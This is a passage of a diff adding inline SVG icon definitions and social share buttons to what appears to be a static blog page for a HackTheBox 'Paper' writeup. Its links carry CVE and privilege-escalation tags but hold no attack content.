+		c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99
+		c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522
+		c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854
+		c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol>
+    <symbol id="icon-telegram" viewBox="0 0 80 80">
+    <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" />
+     </symbol>
+     <symbol id="icon-youtube" viewBox="0 0 24 24">
+       <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" />
+    </symbol>
+    <symbol id="icon-gitlab" viewBox="-5 -15 220 200">
+      <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" />
+      <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" />
+      <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" />
+      &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt;
+      <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" />
+      <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" />
+      <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" />
+    </symbol>
+</defs></svg>
+
+<p><br /></p>
+<section class="share">
+
+    <h2>Share</h2>
+
+    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=HackTheBox &quot;Paper&quot; wirteup is now available!%20http://localhost:4000/writeups/HackTheBox/2022-06-19-Paper/%20via%20&#64;0xbro1&amp;hashtags=CVE-2019-17671,,CVE-2021-3560,,Linux,,authorization-bypass,,credentials-reuse,,polkit-privesc,,rocket.chat,,wordpress," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
+        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
+    </a>
+
+    <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/writeups/HackTheBox/2022-06-19-Paper/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
+        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
+    </a>
+
+    <a aria-label="Share on Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/writeups/HackTheBox/2022-06-19-Paper/&amp;title=Paper&amp;summary=&amp;source=
+    " onclick="window.open(this.href, 'linkedin-share','width=580,height=296');return false;" title="Share on Linkedin">
+        <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg>
+    </a>
+
+</section>
+
+:ET
